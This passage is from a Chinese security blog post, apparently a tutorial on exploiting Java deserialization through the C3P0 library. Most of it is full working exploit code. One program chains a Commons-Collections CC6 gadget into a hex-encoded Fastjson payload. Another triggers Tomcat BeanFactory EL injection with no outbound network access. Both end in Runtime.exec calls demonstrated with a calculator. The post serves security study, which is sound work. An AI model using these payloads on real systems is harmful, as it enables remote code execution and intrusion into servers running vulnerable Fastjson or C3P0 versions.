class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hexBase;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexBaseFastjsonEXP</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//CC6的利用链  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">CC6</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="comment">//使用InvokeTransformer包装一下  </span></span><br><span class="line"> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器  </span></span><br><span class="line"> <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 在 put 之后通过反射修改值  </span></span><br><span class="line"> Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> expMap;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;  </span><br><span class="line">        sw.write(toHexDigit(h1));  </span><br><span class="line">        sw.write(toHexDigit(h2));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">char</span> out;  </span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);  </span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);  </span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);  </span></span><br><span class="line"> <span class="keyword">return</span> out;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//将类序列化为字节数组  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);  </span><br><span class="line">        oos.writeObject(o);  </span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//字节数组转十六进制  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;  </span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)  </span><br><span class="line">            addHexAscii(bytes[i], sw);  </span><br><span class="line">        <span class="keyword">return</span> sw.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));  </span><br><span class="line">        System.out.println(hex);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在低版本 FastJson 下， 也可以使用以下的的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="g2Rbe">不出网情况下</h2>
+URLClassLoader加载远程类，和JNDI注入，都需要目标机器能够出网
+
+<p>加载HexBase字符串，可以作为一种攻击方式，但是缺又需要Fastjson等相关依赖，当目标机器不能出网，而且也没有Fastjson依赖时，C3P0该如何利用</p>
+<p>在高版本JDNI利用中，我们可以通过加载本地Factory类进行攻击，利用的条件之一为该工厂类至少存在一个<code>getObjectInstance</code>方法，例如通过Tomcat8中的<code>org.apache.naming.factory.BeanFactory</code>进行EL表达式注入</p>
+<h3 id="rfzl8">环境配置</h3>
+
+<ul>
+<li>JDK8u65</li>
+<li>导入tomcat依赖</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">8.5</span><span class="number">.15</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Xg8vt">EXP实现</h3>
+其他的链子有的限制太多，有的不出网，有的需要相关依赖
+
+<p>我们这里使用URLClass的链子，EXP如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> NoNetUsing;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoAccessEXP</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Loader_Ref</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> resourceRef;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值  </span></span><br><span class="line"> <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(poolBackedDataSourceBase,c);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化流写入文件  </span></span><br><span class="line"> <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//反序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);  </span><br><span class="line">        objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Loader_Ref</span> <span class="variable">loader_ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader_Ref</span>();  </span><br><span class="line">        serialize(loader_ref);  </span><br><span class="line">        unserialize();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功弹出了计算器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/C3P0/" rel="tag"># C3P0</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/25/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="prev" title="SPEL表达式注入">
+                  <i class="fa fa-angle-left"></i> SPEL表达式注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/04/01/C3P0%E9%93%BE-1/" rel="next" title="C3P0链">
+                  C3P0链 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
